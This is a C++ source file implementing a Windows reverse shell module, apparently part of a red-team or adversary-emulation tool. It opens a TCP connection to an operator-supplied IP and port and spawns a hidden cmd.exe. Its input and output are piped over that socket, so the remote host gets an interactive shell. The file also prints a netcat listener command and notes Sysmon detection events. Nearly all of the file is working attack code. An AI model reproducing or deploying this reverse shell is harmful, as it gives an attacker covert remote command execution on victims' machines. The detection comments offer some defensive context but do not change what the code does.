#include "RevShell.h"
#include <winsock2.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

// ── Globals ────────────────────────────────────────────────────────────────────

static SOCKET   g_sock     = INVALID_SOCKET;
static HANDLE   g_thread   = NULL;
static BOOL     g_running  = FALSE;

// ── Pump: socket → write end of child stdin pipe ──────────────────────────────

struct PumpArgs { SOCKET sock; HANDLE hWrite; };  // socket data → pipe

static DWORD WINAPI PumpSockToPipe(LPVOID p) {
    auto* a = (PumpArgs*)p;
    char buf[4096];
    while (g_running) {
        int r = recv(a->sock, buf, sizeof(buf), 0);
        if (r <= 0) break;
        DWORD written;
        if (!WriteFile(a->hWrite, buf, r, &written, NULL)) break;
    }
    CloseHandle(a->hWrite);
    delete a;
    return 0;
}

// ── Pump: read end of child stdout pipe → socket ──────────────────────────────

struct PumpArgs2 { SOCKET sock; HANDLE hRead; };  // pipe data → socket

static DWORD WINAPI PumpPipeToSock(LPVOID p) {
    auto* a = (PumpArgs2*)p;
    char buf[4096];
    while (g_running) {
        DWORD avail = 0;
        // Use PeekNamedPipe to avoid blocking forever when shell exits
        if (!PeekNamedPipe(a->hRead, NULL, 0, NULL, &avail, NULL)) break;
        if (avail == 0) { Sleep(50); continue; }
        DWORD r = 0;
        if (!ReadFile(a->hRead, buf, min(avail, (DWORD)sizeof(buf)), &r, NULL) || r == 0) break;
        if (send(a->sock, buf, (int)r, 0) == SOCKET_ERROR) break;
    }
    CloseHandle(a->hRead);
    delete a;
    return 0;
}

// ── Main shell thread ──────────────────────────────────────────────────────────

struct ShellArgs { std::string ip; int port; };

static DWORD WINAPI ShellThread(LPVOID param) {
    auto* a = (ShellArgs*)param;
    std::string ip   = a->ip;
    int         port = a->port;
    delete a;

    // ── Connect ──
    WSADATA wsa = {};
    WSAStartup(MAKEWORD(2,2), &wsa);

    SOCKET s = WSASocketA(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if (s == INVALID_SOCKET) { WSACleanup(); return 1; }

    sockaddr_in addr = {};
    addr.sin_family = AF_INET;
    addr.sin_port   = htons((u_short)port);
    inet_pton(AF_INET, ip.c_str(), &addr.sin_addr);

    if (connect(s, (sockaddr*)&addr, sizeof(addr)) != 0) {
        closesocket(s); WSACleanup(); g_running = FALSE; return 1;
    }
    g_sock    = s;
    g_running = TRUE;

    // ── Create anonymous pipes for cmd.exe stdin / stdout / stderr ────────────
    SECURITY_ATTRIBUTES sa = { sizeof(sa), NULL, TRUE };

    // stdin pipe: remote writes → child reads
    HANDLE hStdinR = NULL, hStdinW = NULL;
    CreatePipe(&hStdinR, &hStdinW, &sa, 0);
    SetHandleInformation(hStdinW, HANDLE_FLAG_INHERIT, 0);  // don't inherit write end

    // stdout+stderr pipe: child writes → we read → socket
    HANDLE hStdoutR = NULL, hStdoutW = NULL;
    CreatePipe(&hStdoutR, &hStdoutW, &sa, 0);
    SetHandleInformation(hStdoutR, HANDLE_FLAG_INHERIT, 0);

    // ── Spawn cmd.exe ─────────────────────────────────────────────────────────
    // Detection: cmd.exe spawned with parent != explorer/cmd/powershell = Sysmon EID 1 anomaly.
    STARTUPINFOA si = {};
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput   = hStdinR;
    si.hStdOutput  = hStdoutW;
    si.hStdError   = hStdoutW;

    PROCESS_INFORMATION pi = {};
    std::string cmdLine = S("cmd.exe");
    BOOL ok = CreateProcessA(NULL, &cmdLine[0],
                             NULL, NULL, TRUE,
                             CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    // Close handles the parent doesn't need after spawning
    CloseHandle(hStdinR);
    CloseHandle(hStdoutW);

    if (!ok) {
        CloseHandle(hStdinW); CloseHandle(hStdoutR);
        closesocket(s); g_sock = INVALID_SOCKET; g_running = FALSE;
        WSACleanup();
        return 1;
    }

    // ── Pump threads ──────────────────────────────────────────────────────────
    auto* a1 = new PumpArgs  { s, hStdinW  };
    auto* a2 = new PumpArgs2 { s, hStdoutR };

    HANDLE t1 = CreateThread(NULL, 0, PumpSockToPipe, a1, 0, NULL);
    HANDLE t2 = CreateThread(NULL, 0, PumpPipeToSock, a2, 0, NULL);

    WaitForSingleObject(pi.hProcess, INFINITE);
    g_running = FALSE;

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    closesocket(s);
    g_sock = INVALID_SOCKET;

    if (t1) { WaitForSingleObject(t1, 2000); CloseHandle(t1); }
    if (t2) { WaitForSingleObject(t2, 2000); CloseHandle(t2); }

    WSACleanup();
    return 0;
}

// ── Public API ─────────────────────────────────────────────────────────────────

std::string RevShell::Connect(const std::string& ip, int port) {
    if (g_running || g_sock != INVALID_SOCKET)
        return "revshell: already connected — use `revshell disconnect` first";

    if (port < 1 || port > 65535)
        return "revshell: invalid port";

    auto* a = new ShellArgs{ip, port};
    g_thread = CreateThread(NULL, 0, ShellThread, a, 0, NULL);
    if (!g_thread) { delete a; return "revshell: CreateThread failed"; }

    return "revshell: connecting to " + ip + ":" + std::to_string(port) +
           " (cmd.exe shell, background thread started)\n"
           "Listener: nc -lvp " + std::to_string(port) + "\n"
           "Detection: Sysmon EID 1 (cmd.exe parent anomaly) + EID 3 (network connect)";
}

std::string RevShell::Disconnect() {
    if (g_sock == INVALID_SOCKET) return "revshell: not connected";
    g_running = FALSE;
    closesocket(g_sock);
    g_sock = INVALID_SOCKET;
    return "revshell: socket closed";
}

std::string RevShell::Status() {
    if (g_running && g_sock != INVALID_SOCKET) return "revshell: CONNECTED";
    return "revshell: NOT connected";
}
